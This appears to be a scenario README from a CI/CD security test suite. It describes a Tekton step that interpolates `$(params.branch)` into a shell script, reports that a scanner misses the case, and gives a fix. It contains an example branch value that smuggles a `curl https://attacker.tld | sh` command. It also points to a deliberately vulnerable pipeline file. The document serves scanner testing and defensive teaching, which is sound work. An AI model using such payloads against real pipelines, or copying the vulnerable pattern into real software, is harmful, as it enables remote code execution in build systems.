# Scenario 71: Tekton — `$(params.*)` injected into a step script

**Provider:** Tekton · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`pipeline.yaml`](pipeline.yaml)

## The pattern

```yaml
steps:
  - name: build
    script: |
      echo "building $(params.branch)"
```

A Tekton step interpolates a `$(params.*)` value directly into its `script:`.
Task params can carry attacker-controlled values (a branch name, a PR title
passed through a Pipelines-as-Code trigger), so the param becomes shell syntax.

## How an attacker exploits it

A `branch` param set to `x"; curl https://attacker.tld | sh; #` executes that
command in the step. Tekton analogue of the expression-injection family
(scenarios 02 / 56 / 62).

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | — (its `TKN-003` rule has a quoting carve-out and doesn't fire on the quoted-echo shape here) |

> **All-miss — a completeness probe.** Tekton is scored by pipeline-check only,
> and its `TKN-003` rule fired on this `"…$(params.*)…"` shape in an older
> version but no longer does (a defensive-quoting carve-out, like the GitHub
> Actions GHA-003 behavior). The injection is still real — Tekton substitutes
> the param before the shell runs — so this row probes that completeness gap.

## Fix

Don't interpolate `$(params.*)` into `script:`. Bind the param to an `env:` var
on the step and reference it quoted (`"$BRANCH"`), or pass it as an argument to
a pinned program rather than building a shell string.

## References

- Tekton — Tasks (params, results, security): https://tekton.dev/docs/pipelines/tasks/
